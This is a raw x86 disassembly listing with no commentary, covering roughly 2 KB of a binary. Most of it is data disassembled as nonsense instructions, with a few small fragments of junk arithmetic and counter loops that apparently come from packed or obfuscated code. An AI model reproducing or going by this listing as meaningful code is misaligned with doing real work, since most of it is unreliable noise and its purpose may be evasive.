  4061b9:	jae    0x4061c0
  4061bb:	jb     0x4061c7
  4061bd:	and    eax,0x8e6aaeb5
  4061c2:	xchg   esp,eax
  4061c3:	sbb    dh,al
  4061c5:	xchg   esp,eax
  4061c6:	push   ds
  4061c7:	mov    ebp,0xbf7d9fd
  4061cc:	push   eax
  4061cd:	pop    ebp
  4061ce:	call   0xcb4eba03
  4061d3:	shl    ebx,cl
  4061d5:	xchg   ebx,eax
  4061d6:	sbb    bl,dh
  4061d8:	mov    dl,0xe7
  4061da:	inc    edx
  4061db:	mov    al,BYTE PTR [edi-0x28]
  4061de:	inc    eax
  4061df:	mov    edi,0xc5f6ba83
  4061e4:	cwde   
  4061e5:	cwde   
  4061e6:	xor    eax,0x10c1d720
  4061eb:	xchg   eax,ecx
  4061ed:	push   edx
  4061ee:	ds push ebx
  4061f0:	sub    cl,cl
  4061f2:	xchg   edi,esp
  4061f4:	cld    
  4061f5:	int    0x67
  4061f7:	xchg   ebp,eax
  4061f8:	sbb    al,0xb3
  4061fa:	(bad)  
  4061fb:	jmp    FWORD PTR [ebp*2-0x6c2bf376]
  406202:	xchg   ebx,eax
  406203:	lea    ebp,[ecx]
  406205:	mov    esi,0x91b0764a
  40620a:	cmp    BYTE PTR [eax+0x7204d2d5],ah
  406210:	jne    0x406277
  406212:	jg     0x4061d0
  406214:	push   0x13
  406216:	xor    al,0xd1
  406218:	arpl   WORD PTR [ecx+ecx*2],bx
  40621b:	test   al,0x7d
  40621d:	push   ss
  40621e:	arpl   WORD PTR [eax],di
  406220:	out    dx,eax
  406221:	jns    0x406231
  406223:	mov    edi,0x454e4053
  406228:	adc    al,0xfe
  40622a:	and    DWORD PTR [edx-0x40efafb0],esp
  406230:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406231:	xchg   esp,eax
  406232:	mov    esp,0xb26ca510
  406237:	pop    eax
  406238:	lea    edx,[ecx-0x1a]
  40623b:	push   eax
  40623c:	aad    0xc8
  40623e:	add    eax,0x2bf7dba5
  406243:	out    0x2c,eax
  406245:	and    DWORD PTR [edx+esi*4+0x12],edx
  406249:	dec    esi
  40624a:	mov    edx,0xc3c4e22e
  40624f:	imul   esi,DWORD PTR ds:0x325401f6,0xbe2aa728
  406259:	ret    0x9142
  40625c:	mov    eax,0xdf3afe3c
  406261:	cmp    eax,0x1afd1e8
  406266:	xchg   ebp,eax
  406267:	je     0x4062bf
  406269:	(bad)  
  40626a:	jp     0x40626d
  40626c:	add    DWORD PTR [ecx+edx*4+0x77],ebx
  406270:	add    al,0xb2
  406272:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406273:	shr    BYTE PTR [edi],1
  406275:	inc    ebp
  406276:	or     al,0x75
  406278:	int    0x4c
  40627a:	inc    edx
  40627b:	mov    esp,0xe90a261a
  406280:	push   es
  406281:	mov    al,ds:0x619f3ef8
  406286:	das    
  406287:	mov    ah,0x22
  406289:	test   BYTE PTR [ecx-0x748ebfc6],al
  40628f:	inc    ebp
  406290:	sbb    BYTE PTR [ebx+0x2d811075],cl
  406296:	or     ebp,edi
  406298:	inc    edx
  406299:	add    BYTE PTR [esi-0x76ffbd03],al
  40629f:	inc    esi
  4062a0:	or     al,0x9
  4062a2:	or     eax,0x42e6f3
  4062a7:	mov    eax,DWORD PTR [ebp+0x1c]
  4062aa:	mov    DWORD PTR ds:0x42fd72,0x1e
  4062b4:	cmp    DWORD PTR ds:0x42fd72,0x0
  4062bb:	je     0x40630e
  4062c1:	cmp    DWORD PTR ds:0x42fd72,0x7
  4062c8:	jne    0x4062e2
  4062ce:	push   0x4403
  4062d3:	push   DWORD PTR [ebp-0x10]
  4062d6:	push   DWORD PTR [ebp-0x24]
  4062d9:	push   DWORD PTR [ebp-0x10]
  4062dc:	call   DWORD PTR ds:0x42e53b
  4062e2:	cmp    DWORD PTR ds:0x42fd72,0x8
  4062e9:	jne    0x4062fc
  4062ef:	mov    esi,DWORD PTR ds:0x42fd72
  4062f5:	dec    esi
  4062f6:	mov    DWORD PTR ds:0x42fd72,esi
  4062fc:	mov    esi,DWORD PTR ds:0x42fd72
  406302:	dec    esi
  406303:	mov    DWORD PTR ds:0x42fd72,esi
  406309:	jmp    0x4062b4
  40630e:	mov    esi,DWORD PTR [ebp+0x10]
  406311:	mov    DWORD PTR [esi+0x10],eax
  406314:	mov    eax,eax
  406316:	mov    eax,DWORD PTR [ebp+0x8]
  406319:	xor    eax,ecx
  40631b:	add    eax,edx
  40631d:	jmp    0x4064e3
  406322:	jge    0x4063a3
  406324:	gs cli 
  406326:	gs (bad) 
  406329:	sti    
  40632a:	ret    
  40632b:	pusha  
  40632c:	jo     0x4062dd
  40632e:	daa    
  40632f:	lods   eax,DWORD PTR ds:[esi]
  406330:	ins    DWORD PTR es:[edi],dx
  406331:	enter  0x3c8c,0x70
  406335:	jo     0x4062de
  406337:	jg     0x4063a9
  406339:	jo     0x406309
  40633b:	rol    BYTE PTR [edi],0xb2
  40633e:	ins    BYTE PTR es:[edi],dx
  40633f:	mov    dl,0xc9
  406341:	pushf  
  406342:	dec    esi
  406343:	outs   dx,BYTE PTR ds:[esi]
  406344:	add    eax,edx
  406346:	add    BYTE PTR [eax-0x74b51b41],dh
  40634c:	retf   0x82af
  40634f:	(bad)  [edx+0x15]
  406352:	mov    esp,0x9d23891a
  406357:	lea    edi,cs:[edx]
  40635a:	pushf  
  40635b:	dec    eax
  40635c:	ret    0x53c4
  40635f:	xor    eax,0xaac94443
  406364:	and    bl,bh
  406366:	imul   ah
  406368:	lahf   
  406369:	jno    0x40633d
  40636b:	ror    BYTE PTR [edx+0x72],1
  40636e:	pop    ebp
  40636f:	fild   QWORD PTR [esi+ecx*1+0x38c23461]
  406376:	and    ecx,edx
  406378:	out    0xb0,al
  40637a:	stos   DWORD PTR es:[edi],eax
  40637b:	mov    ecx,0x3b3fec47
  406380:	mov    al,ds:0x67e4eef4
  406385:	cld    
  406386:	xor    BYTE PTR [ebx-0x55596c4f],ch
  40638c:	rcr    BYTE PTR [ecx+ecx*2],1
  40638f:	and    al,0xb1
  406391:	fidiv  WORD PTR [ebx+0x39]
  406394:	inc    ecx
  406395:	push   ss
  406396:	ds push 0xeb2ad185
  40639c:	(bad)  
  40639d:	call   0x60d6:0x713de542
  4063a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063a5:	(bad)  
  4063a6:	lds    edi,FWORD PTR [ebx-0x2b9cc30b]
  4063ac:	es jmp 0x40639c
  4063af:	mov    ecx,0x2aeeabbc
  4063b4:	mov    dh,0x5
  4063b6:	sbb    DWORD PTR [esi-0xce60b83],esp
  4063bc:	adc    al,0x56
  4063be:	adc    al,al
  4063c0:	push   DWORD PTR [esi]
  4063c2:	jbe    0x4063c0
  4063c4:	das    
  4063c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063c6:	jb     0x4063e9
  4063c8:	into   
  4063c9:	jg     0x4063c1
  4063cb:	jecxz  0x406408
  4063cd:	aad    0xaa
  4063cf:	aas    
  4063d0:	sub    al,0xba
  4063d2:	pop    ss
  4063d3:	jae    0x4063b6
  4063d5:	and    bl,BYTE PTR [eax+0x42af8d25]
  4063db:	jecxz  0x406457
  4063dd:	sbb    eax,DWORD PTR [ebx+0xd]
  4063e0:	and    cl,bl
  4063e2:	dec    edx
  4063e3:	sbb    ebx,eax
  4063e5:	enter  0x1210,0xd4
  4063e9:	loope  0x40641a
  4063eb:	in     eax,dx
  4063ec:	xor    eax,0x259be2d
  4063f1:	and    BYTE PTR [edi+0x788848f0],bl
  4063f7:	push   ebp
  4063f8:	jns    0x40642b
  4063fa:	clc    
  4063fb:	mov    ds:0x4a9333bc,eax
  406400:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406402:	loop   0x40647a
  406404:	and    ebp,esp
  406406:	adc    ebp,eax
  406408:	pushf  
  406409:	adc    al,0x52
  40640b:	dec    DWORD PTR [eax]
  40640d:	dec    esp
  40640e:	outs   dx,BYTE PTR ds:[esi]
  40640f:	(bad)  
  406410:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406411:	and    dl,BYTE PTR [edi+ecx*1+0x62]
  406415:	mov    ds:0xdbc8da33,eax
  40641a:	ficomp WORD PTR [edx+ecx*1-0x6]
  40641e:	push   es
  40641f:	dec    edx
  406420:	je     0x406422
  406422:	adc    DWORD PTR [ebx-0x71],eax
  406425:	in     al,0x83
  406427:	int3   
  406428:	sub    al,0x39
  40642a:	aam    0x5a
  40642c:	sbb    eax,0x6f91d
  406431:	sti    
  406432:	scas   al,BYTE PTR es:[edi]
  406433:	stos   DWORD PTR es:[edi],eax
  406434:	xchg   esi,eax
  406435:	ficomp DWORD PTR [ebx-0x4ed3de6b]
  40643b:	or     dh,ch
  40643d:	add    eax,0x125b5722
  406442:	or     BYTE PTR [ebp+0x8],ch
  406445:	add    BYTE PTR [edi],ch
  406447:	dec    eax
  406448:	enter  0x2b71,0xd
  40644c:	jmp    0x4064c2
  40644e:	aad    0xe6
  406450:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406451:	mov    bl,0xf1
  406453:	jge    0x4064ae
  406455:	inc    esi
  406456:	jecxz  0x4064af
  406458:	jb     0x6a1b4de3
  40645e:	icebp  
  40645f:	pop    edx
  406460:	cli    
  406461:	cdq    
  406462:	jge    0x406465
  406464:	jbe    0x406445
  406466:	mov    cs:0xcb97a3e7,eax
  40646c:	adc    bl,dh
  40646e:	fs dec edi
  406470:	sub    DWORD PTR [eax+0x8d5e40b],esp
  406476:	sar    DWORD PTR [eax],0x69
  406479:	cmc    
  40647a:	icebp  
  40647b:	or     ebx,ebx
  40647d:	clc    
  40647e:	and    BYTE PTR [ecx-0x5d6218e8],0x40
  406485:	cld    
  406486:	ds sti 
  406488:	ror    BYTE PTR [edx+0x7c],0x8
  40648c:	jg     0x406508
  40648e:	xlat   BYTE PTR gs:[ebx]
  406490:	mov    ds:0x502ff6cb,eax
  406495:	aaa    
  406496:	in     al,0xf8
  406498:	add    eax,0xa94d86bd
  40649d:	xlat   BYTE PTR ds:[ebx]
  40649e:	stos   DWORD PTR es:[edi],eax
  40649f:	jmp    0x4064c4
  4064a1:	and    ecx,DWORD PTR [esi-0x42f5c1ac]
  4064a7:	add    eax,0x5965c342
  4064ac:	sub    al,0xa5
  4064ae:	push   ebp
  4064af:	push   esi
  4064b0:	jecxz  0x40649b
  4064b2:	ja     0x40643d
  4064b4:	and    edi,DWORD PTR [esi+0x45c2fdfb]
  4064ba:	adc    eax,DWORD PTR [ecx+0x2fc1ee7e]
  4064c0:	lea    ebx,[ecx+0x5a]
  4064c3:	ins    BYTE PTR es:[edi],dx
  4064c4:	out    0x23,al
  4064c6:	ret    
  4064c7:	shl    BYTE PTR [ebx],1
  4064c9:	outs   dx,BYTE PTR ds:[esi]
  4064ca:	jle    0x40646d
  4064cc:	aam    0xd8
  4064ce:	adc    DWORD PTR [ecx],ecx
  4064d0:	pop    ebx
  4064d1:	jbe    0x4064fb
  4064d3:	xchg   esi,eax
  4064d4:	or     al,0xef
  4064d6:	in     eax,0x70
  4064d8:	adc    edi,DWORD PTR [esi+0x6c5b86a]
  4064de:	sub    al,BYTE PTR [ecx]
  4064e0:	sbb    eax,0xc95ef256
  4064e5:	ret    0x18
  4064e8:	push   ebp
  4064e9:	mov    ebp,esp
  4064eb:	mov    eax,DWORD PTR [ebp+0xc]
  4064ee:	xor    edx,edx
  4064f0:	mov    ecx,0x7264fca9
  4064f5:	div    ecx
  4064f7:	mov    ecx,DWORD PTR [ebp+0x10]
  4064fa:	and    ecx,eax
  4064fc:	or     ecx,0x81161d8f
  406502:	mov    eax,ecx
  406504:	pop    ebp
  406505:	ret    0x18
  406508:	push   ebp
  406509:	mov    ebp,esp
  40650b:	push   ecx
  40650c:	adc    DWORD PTR ds:0x42fd76,edi
  406512:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  406519:	mov    eax,DWORD PTR [ebp-0x4]
  40651c:	sbb    ecx,DWORD PTR ds:0x42fcf9
  406522:	mov    edx,DWORD PTR [ebp+0x10]
  406525:	mov    ecx,0x7510855
  40652a:	xor    eax,ecx
  40652c:	add    eax,0x32729c
  406531:	mov    DWORD PTR [edx],eax
  406533:	sub    DWORD PTR ds:0x42fd72,edi
  406539:	mov    eax,DWORD PTR [ebp+0x14]
  40653c:	sub    DWORD PTR ds:0x42fd72,ecx
  406542:	mov    edx,DWORD PTR [ebp+0x10]
  406545:	and    DWORD PTR ds:0x42fcd9,0x42e6fb
  40654f:	mov    DWORD PTR [edx+0x4],eax
  406552:	mov    eax,DWORD PTR [ebp+0x18]
  406555:	jmp    0x4067e0
  40655a:	mov    ss,edx
  40655c:	jg     0x40659a
  40655e:	inc    ebx
  40655f:	ror    DWORD PTR [ecx+0x52],1
  406562:	jae    0x4065d2
  406564:	pop    edx
  406565:	dec    ecx
  406566:	and    DWORD PTR [ebp+0x45],0x703a33da
  40656d:	jo     0x406551
  40656f:	jle    0x4065e1
  406571:	jo     0x40654f
  406573:	gs mov dl,0xd2
  406576:	add    eax,0x6f89350
  40657b:	aad    0x9e
  40657d:	repnz push ebp
  40657f:	jo     0x4065d6
  406581:	mov    ch,0x99
  406583:	mov    WORD PTR [esi],ss
  406585:	or     DWORD PTR [edi],esi
  406587:	call   DWORD PTR [ebp+0x52]
  40658a:	pop    edx
  40658b:	loopne 0x406516
  40658d:	inc    esp
  40658e:	daa    
  40658f:	mov    cl,0x34
  406591:	jno    0x40656b
  406593:	daa    
  406594:	sbb    al,0xc2
  406596:	cwde   
  406597:	dec    ebp
  406598:	jb     0x406605
  40659a:	ja     0x4065e5
  40659c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40659d:	out    0x76,al
  40659f:	add    DWORD PTR [esi],ebp
  4065a1:	xor    BYTE PTR [edx+ebp*8],ah
  4065a4:	fld    QWORD PTR [ebx-0x5ce252b1]
  4065aa:	mov    ch,al
  4065ac:	push   es
  4065ad:	mov    ah,0x8e
  4065af:	dec    edx
  4065b0:	stc    
  4065b1:	sub    DWORD PTR [ebx],ebp
  4065b3:	sub    al,0xa1
  4065b5:	push   ss
  4065b6:	jne    0x4065a3
  4065b8:	jne    0x406563
  4065ba:	or     bl,BYTE PTR [eax+eax*2]
  4065bd:	inc    ebx
  4065be:	or     BYTE PTR [ebx+0x146a8f59],0x14
  4065c5:	rcr    ch,0xbe
  4065c8:	mov    BYTE PTR [ebx-0x5fbb1995],ah
  4065ce:	mov    ecx,0xbcd52fc6
  4065d3:	jmp    0x4065fe
  4065d5:	adc    BYTE PTR [esi],dh
  4065d7:	je     0x40659c
  4065d9:	ror    DWORD PTR ds:0x7749d8b1,cl
  4065df:	dec    edi
  4065e0:	fidivr DWORD PTR [esi+ecx*8-0x7f]
  4065e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065e5:	leave  
  4065e6:	das    
  4065e7:	stc    
  4065e8:	mov    al,ds:0x2c81f5c1
  4065ed:	sub    ebx,DWORD PTR [edx+eiz*2-0x3caf7c4e]
  4065f4:	mov    DWORD PTR [esi+0x3b],esp
  4065f7:	mov    ch,0xd7
  4065f9:	cdq    
  4065fa:	cld    
  4065fb:	lds    ebp,FWORD PTR [esi+ebx*1-0x61]
  4065ff:	iret   
  406600:	test   eax,0xa735ab76
  406605:	pop    ss
  406606:	pop    esi
  406607:	mov    esi,0x2199eb06
  40660c:	dec    ecx
  40660d:	cmp    al,0x17
  40660f:	xor    eax,0x506ad3d5
  406614:	or     BYTE PTR [eax-0xa],0xb2
  406618:	std    
  406619:	mov    al,0xcb
  40661b:	pop    ebx
  40661c:	jg     0x4065b7
  40661e:	sub    esp,DWORD PTR [ecx-0x45ca10cc]
  406624:	or     al,0x29
  406626:	cwde   
  406627:	sti    
  406628:	hlt    
  406629:	ror    DWORD PTR [eax+0x73],1
  40662c:	cmc    
  40662d:	adc    al,0x3e
  40662f:	std    
  406630:	arpl   WORD PTR [ecx],si
  406632:	mov    ds:0x4bfc582c,al
  406637:	pop    esp
  406638:	pop    esi
  406639:	mov    esi,0x96a35d34
  40663e:	jle    0x40668f
  406640:	clc    
  406641:	push   es
  406642:	xor    BYTE PTR [edx-0x61],dl
  406645:	or     cl,BYTE PTR [edi-0x12]
  406648:	jns    0x4066a9
  40664a:	sbb    BYTE PTR [ebp+0x25],ch
  40664d:	icebp  
  40664e:	loope  0x4066a5
  406650:	aad    0x68
  406652:	mov    edx,0x8e1d4e2d
  406657:	add    DWORD PTR [edi+ebx*1],eax
  40665a:	punpcklwd mm3,mm0
  40665d:	adc    DWORD PTR [edx],0xc2034758
  406663:	adc    BYTE PTR [esi],ch
  406665:	in     al,0xe
  406667:	out    dx,al
  406668:	ss cdq 
  40666a:	shrd   DWORD PTR [edi-0x7],edi,cl
  40666e:	push   esp
  40666f:	out    0xe3,al
  406671:	inc    esp
  406672:	inc    esp
  406673:	sahf   
  406674:	sub    ebp,esi
  406676:	lods   al,BYTE PTR ds:[esi]
  406677:	clc    
  406678:	xchg   ebx,eax
  406679:	pop    edi
  40667a:	cld    
  40667b:	fwait
  40667c:	jmp    0xc322475c
  406681:	add    al,bl
  406683:	jb     0x4066c7
  406685:	mov    ds:0xe1273135,eax
  40668a:	mov    DWORD PTR [esi-0x28c0050e],edi
  406690:	cwde   
  406691:	fdiv   DWORD PTR [ebx+ebp*1-0x3d]
  406695:	mov    ah,0x7e
  406697:	adc    bh,BYTE PTR [ebp-0x5abb10f5]
  40669d:	leave  
  40669e:	mov    bh,0x90
  4066a0:	dec    eax
  4066a1:	sub    ebx,0xe99fb459
  4066a7:	ret    0xf008
  4066aa:	mov    DWORD PTR [esp+eax*8+0x2936dba2],ebx
  4066b1:	scas   eax,DWORD PTR es:[edi]
  4066b2:	and    al,0xc7
  4066b4:	cmp    DWORD PTR [eax-0x122ba7d8],edx
  4066ba:	jge    0x406703
  4066bc:	int3   
  4066bd:	ins    BYTE PTR es:[edi],dx
  4066be:	pop    ecx
  4066bf:	rcl    DWORD PTR [ebx+ecx*1-0x5ec720ac],cl
  4066c6:	fcom   QWORD PTR [ebx+0x10]
  4066c9:	jmp    0x40669c
  4066cb:	mov    bl,0xe6
  4066cd:	mov    al,0xd7
  4066cf:	ret    
  4066d0:	shl    DWORD PTR [ebx-0x6cf6b1d],0x2e
  4066d7:	cmp    edx,DWORD PTR [ebx+ecx*8]
  4066da:	push   ecx
  4066db:	xchg   esi,eax
  4066dc:	neg    DWORD PTR [ebp+0x2ba80c17]
  4066e2:	ja     0x4066ca
  4066e4:	pop    DWORD PTR [eax]
  4066e6:	stos   DWORD PTR es:[edi],eax
  4066e7:	or     al,0xd7
  4066e9:	xor    dl,dh
  4066eb:	retf   0xa64e
  4066ee:	push   es
  4066ef:	cwde   
  4066f0:	push   ds
  4066f1:	push   ebx
  4066f2:	cmp    DWORD PTR [ebx],0xfffffff6
  4066f5:	ins    DWORD PTR es:[edi],dx
  4066f6:	dec    esi
  4066f7:	pop    ds
  4066f8:	mov    cl,0x52
  4066fa:	adc    ecx,DWORD PTR [esi]
  4066fc:	push   esi
  4066fd:	push   eax
  4066fe:	loopne 0x406729
  406700:	std    
  406701:	jne    0x4066b7
  406703:	inc    ebp
  406704:	push   ss
  406705:	dec    esp
  406706:	push   ss
  406707:	popa   
  406708:	sahf   
  406709:	jmp    0x406778
  40670b:	test   eax,0x36eaa50a
  406710:	cmp    cl,0xb7
  406713:	mov    cl,0xa6
  406715:	bound  ebp,QWORD PTR ss:[ebp+esi*8-0x37b56230]
  40671d:	jmp    0xa009:0x7c5890df
  406724:	pop    ss
  406725:	adc    DWORD PTR [ebp+0x4a],edi
  406728:	into   
  406729:	inc    ecx
  40672a:	mov    eax,ds:0xc2cc741c
  40672f:	(bad)  
  406730:	xor    esi,DWORD PTR [ebx]
  406732:	out    0xd,al
  406734:	xor    al,0xd7
  406736:	iret   
  406737:	ins    BYTE PTR es:[edi],dx
  406738:	adc    cl,BYTE PTR [ecx]
  40673a:	pop    esi
  40673b:	inc    edx
  40673c:	lahf   
  40673d:	adc    al,0xb7
  40673f:	push   ss
  406740:	mov    bh,0x6e
  406742:	xchg   esp,eax
  406743:	fcmovnb st,st(2)
  406745:	push   0x2f
  406747:	cmp    eax,0x81cf01bd
  40674c:	mov    bl,0xed
  40674e:	mov    ecx,0xf7d86bf9
  406753:	in     al,dx
  406754:	outs   dx,DWORD PTR ds:[esi]
  406755:	sub    BYTE PTR [edx],bh
  406757:	(bad)  
  406758:	andps  xmm3,XMMWORD PTR [edi]
  40675b:	jle    0x406768
  40675d:	fisubr DWORD PTR [eax+eiz*2+0x23]
  406761:	pop    edx
  406762:	mov    eax,0x8ae6bfd
  406767:	hlt    
  406768:	pop    ebx
  406769:	aaa    
  40676a:	ss jnp 0x40671d
  40676d:	jno    0x40672a
  40676f:	dec    ebp
  406770:	je     0x406763
  406772:	popf   
  406773:	mov    ds:0xbf653ce9,eax
  406778:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406779:	jne    0x4067ac
  40677b:	popa   
  40677c:	scas   al,BYTE PTR es:[edi]
  40677d:	rcr    BYTE PTR [eax+ecx*8],cl
  406780:	add    DWORD PTR [esi-0x55],ebp
  406783:	adc    bh,BYTE PTR [ebp+0x17]
  406786:	sahf   
  406787:	cmp    eax,0x940dc3a9
  40678c:	in     al,dx
  40678d:	stos   DWORD PTR es:[edi],eax
  40678e:	call   0xd70ee460
  406793:	(bad)  
  406794:	jbe    0xed8250de
  40679a:	inc    edi
  40679b:	push   0x63
  40679d:	sbb    DWORD PTR [ecx+ebp*2-0x7c22c925],edi
  4067a4:	bound  ebp,QWORD PTR [eax+ebx*4-0x497a9f72]
  4067ab:	dec    edx
  4067ac:	call   0x39f06f15
  4067b1:	xor    BYTE PTR [eax+0x59],dl
  4067b4:	or     edx,ebx
  4067b6:	push   ds
  4067b7:	lahf   
  4067b8:	test   al,0xe
  4067ba:	repz jo 0x406744
  4067bd:	ins    DWORD PTR es:[edi],dx
  4067be:	pop    es
  4067bf:	and    BYTE PTR [ebx],0xa2
  4067c2:	jmp    0xf037:0xb65adba7
  4067c9:	sbb    eax,0x8912190f
  4067ce:	ins    DWORD PTR es:[edi],dx
  4067cf:	pop    ebx
  4067d0:	in     eax,0xf1
  4067d2:	cmp    dh,dh
  4067d4:	xor    ah,BYTE PTR [ecx-0x5870379]
  4067da:	dec    ebx
  4067db:	hlt    
  4067dc:	fwait
  4067dd:	push   ebx
  4067de:	ret    
  4067df:	dec    ebp
  4067e0:	mov    edx,DWORD PTR [ebp+0x10]
  4067e3:	mov    DWORD PTR [edx+0x8],eax
  4067e6:	xor    eax,edx
  4067e8:	mov    eax,DWORD PTR [ebp+0x1c]
  4067eb:	mov    edx,DWORD PTR [ebp+0x10]
  4067ee:	adc    DWORD PTR ds:0x42fcd5,0x1a3e
  4067f8:	mov    DWORD PTR [edx+0xc],eax
  4067fb:	mov    eax,DWORD PTR [ebp+0x20]
  4067fe:	or     DWORD PTR ds:0x42e120,0x7513
  406808:	mov    edx,DWORD PTR [ebp+0x10]
  40680b:	sub    DWORD PTR ds:0x42e6fb,0x76c6
  406815:	mov    DWORD PTR [edx+0x10],eax
  406818:	and    DWORD PTR ds:0x42fce5,0x42e713
  406822:	mov    eax,eax
  406824:	mov    eax,DWORD PTR [ebp+0x14]
  406827:	test   eax,eax
  406829:	mov    eax,DWORD PTR [ebp+0x8]
  40682c:	jne    0x406ac0
  406832:	mov    eax,DWORD PTR [ebp+0xc]
  406835:	jmp    0x406ac0
  40683a:	sub    DWORD PTR ds:0x49e98909,edi
  406840:	test   eax,0xf5555d5d
  406845:	pushf  
  406846:	inc    esp
  406847:	jge    0x40684c
  406849:	retf   
  40684a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40684b:	cmp    BYTE PTR [eax+0x70],dh
  40684e:	loop   0x4068ce
  406850:	jo     0x4068c2
  406852:	mov    eax,0x59f52317
  406857:	pushf  
  406858:	dec    ecx
  406859:	cmp    edx,DWORD PTR [ecx-0x66]
  40685c:	pop    esp
  40685d:	(bad)  [eax+0x6]
  406860:	fmul   DWORD PTR [eax]
  406862:	mov    ch,0x46
  406864:	xchg   BYTE PTR [ecx],ch
  406866:	push   eax
  406867:	add    eax,0x79b1bb78
  40686c:	pop    ds
  40686d:	jl     0x40682f
  40686f:	js     0x406813
  406871:	sub    eax,0x3be41545
  406876:	aas    
  406877:	mov    ds:0x3e0ec1db,al
  40687c:	jle    0x40688a
  40687e:	mov    BYTE PTR [ecx-0xd],al
  406881:	mov    al,0x59
  406883:	push   edi
  406884:	pop    ss
  406885:	cmp    eax,0xd509dbfa
  40688a:	jmp    0x8b7bac06
  40688f:	mov    bl,0x10
  406891:	and    al,0xf6
  406893:	mov    BYTE PTR [ebx+edi*8],bh
  406896:	sub    BYTE PTR [edi+0x55],dl
  406899:	sub    dh,BYTE PTR [ecx+0x36]
  40689c:	dec    ebp
  40689d:	ja     0x4068df
  40689f:	(bad)  
  4068a0:	jo     0x40682f
  4068a2:	sbb    BYTE PTR [esi-0x40a61eae],bl
  4068a8:	xor    BYTE PTR [ecx-0x26c965ff],dh
  4068ae:	gs xchg ebp,eax
  4068b0:	or     DWORD PTR [ecx+0x46],edx
  4068b3:	call   0xed12:0xc631d196
  4068ba:	nop
  4068bb:	mov    ds,WORD PTR [edx+edi*4-0xa]
  4068bf:	push   esi
  4068c0:	sbb    al,0xf8
  4068c2:	sbb    eax,0x1faa9a2c
  4068c7:	retf   0xde95
  4068ca:	iret   
  4068cb:	push   ss
  4068cc:	(bad)  ds:0xf54267ce
  4068d2:	sbb    dl,BYTE PTR [esi+0x4c]
  4068d5:	mov    ebx,0x156ccfeb
  4068da:	adc    BYTE PTR [edi+0x25],ch
  4068dd:	test   BYTE PTR [eax-0x254831fc],bh
  4068e3:	cmp    ebx,DWORD PTR [ebx+ebp*2]
  4068e6:	aam    0x46
  4068e8:	loopne 0x406904
  4068ea:	pusha  
  4068eb:	sub    eax,DWORD PTR [edx+0x18]
  4068ee:	stc    
  4068ef:	fadd   st(0),st
  4068f1:	loop   0x40696d
  4068f3:	dec    eax
  4068f4:	mov    ecx,0xf0c2471f
  4068f9:	jb     0x4068fb
  4068fb:	aaa    
  4068fc:	xor    BYTE PTR [ebx+0x28],0xd9
  406900:	lods   al,BYTE PTR ds:[esi]
  406901:	pusha  
  406902:	add    DWORD PTR ds:0xcda2b1c5,ebp
  406908:	fistp  DWORD PTR [eax+0x370094]
  40690e:	mov    al,0x30
  406910:	bound  esp,QWORD PTR [edi-0x16]
  406913:	adc    eax,eax
  406915:	inc    eax
  406916:	gs sbb eax,eax
  406919:	cli    
  40691a:	mov    gs,WORD PTR [edx+0x71056d01]
  406920:	ret    0xfc07
  406923:	fldcw  WORD PTR [edi+0x10]
  406926:	mov    ebx,0x5adee7e0
  40692b:	loope  0x406955
  40692d:	lea    ecx,[esi+0x54]
  406930:	in     al,dx
  406931:	xchg   esi,eax
  406932:	adc    esp,esi
  406934:	adc    esi,DWORD PTR [ebx-0x61]
  406937:	popf   
  406938:	ret    0xde70
  40693b:	fwait
  40693c:	cli    
  40693d:	pop    esp
  40693e:	mov    eax,0x8b5fcc25
  406943:	adc    ecx,DWORD PTR [esp+edi*2-0x40]
  406947:	mov    ebp,ebp
  406949:	xor    BYTE PTR [eax+esi*4],ah
  40694c:	and    al,0x68
  40694e:	push   es
  40694f:	jnp    0x40699d
  406951:	scas   al,BYTE PTR es:[edi]
  406952:	inc    ecx
  406953:	adc    DWORD PTR [esi+0x18],edx
  406956:	mov    ah,0x4e
  406958:	cmp    al,0x38
  40695a:	icebp  
  40695b:	and    eax,0xc0bd5232
  406960:	bound  ebx,QWORD PTR [ebx]
  406962:	aaa    
  406963:	mov    dl,BYTE PTR [ebx-0x7b]
  406966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406967:	mov    al,0x44
  406969:	adc    bl,al
  40696b:	mov    ebx,0x6a62c9aa
  406970:	mov    ebx,0x4d25c8d3
  406975:	mov    esi,0x97eaf212
  40697a:	xchg   BYTE PTR [ebx+eax*2-0x45],al
  40697e:	jns    0x406951
  406980:	jno    0x40694e
  406982:	mov    bh,0xd9
  406984:	imul   DWORD PTR [ecx-0x52]
  406987:	popf   
  406988:	ficomp WORD PTR [edi+edi*4]
  40698b:	or     al,0xe4
  40698d:	xchg   edx,eax
  40698e:	inc    esi
  40698f:	adc    BYTE PTR [eax+ebx*1],al
  406992:	mov    al,0xe5
  406994:	push   esp
  406995:	xchg   ebx,eax
  406996:	nop
  406997:	imul   ebp,DWORD PTR [ecx+eiz*2],0xffffff92
  40699b:	cmp    edx,0x94269787
  4069a1:	pop    ebp
  4069a2:	test   DWORD PTR [edi+edi*8-0x614c1f46],0x2611b478
  4069ad:	popf   
  4069ae:	cmp    dh,BYTE PTR [edi-0x42d93c92]
  4069b4:	cmp    ebp,edi
  4069b6:	(bad)  
  4069b7:	fisub  DWORD PTR [esi-0x5479831e]
  4069bd:	pop    edx
  4069be:	out    dx,al
  4069bf:	je     0x406a3c
  4069c1:	xchg   edx,eax
  4069c2:	loopne 0x4069ec
  4069c4:	loop   0x4069a4
  4069c6:	jle    0x4069a4
  4069c8:	jecxz  0x406a26
  4069ca:	dec    edi
  4069cb:	pop    ecx
  4069cc:	cmp    DWORD PTR [esi+esi*4],0xa9a21594
  4069d3:	mov    ds:0x54a45257,eax
  4069d8:	add    BYTE PTR [edi],ah
  4069da:	jne    0x406a55
  4069dc:	js     0x406a4c
  4069de:	pop    esp
  4069df:	cmp    eax,DWORD PTR [ebp+0xc]
  4069e2:	iretw  
